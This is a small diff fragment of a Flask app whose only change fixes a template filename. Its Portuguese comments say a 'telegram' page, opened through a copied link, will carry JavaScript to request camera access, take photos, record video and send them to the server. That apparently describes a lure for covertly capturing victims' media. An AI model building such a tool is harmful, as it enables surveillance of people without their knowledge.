@@ -41,7 +41,7 @@ def telegram():
     # Esta página será aberta quando o link copiado for acessado.
     # Ela precisará conter o JavaScript para solicitar acesso à câmera,
     # tirar a foto, gravar o vídeo e enviar para o servidor.
-    return render_template('telegram') # Criaremos este arquivo HTML
+    return render_template('telegram.html') # Criaremos este arquivo HTML
 
 @app.route('/salvar_midia', methods=['POST'])
 def salvar_midia():
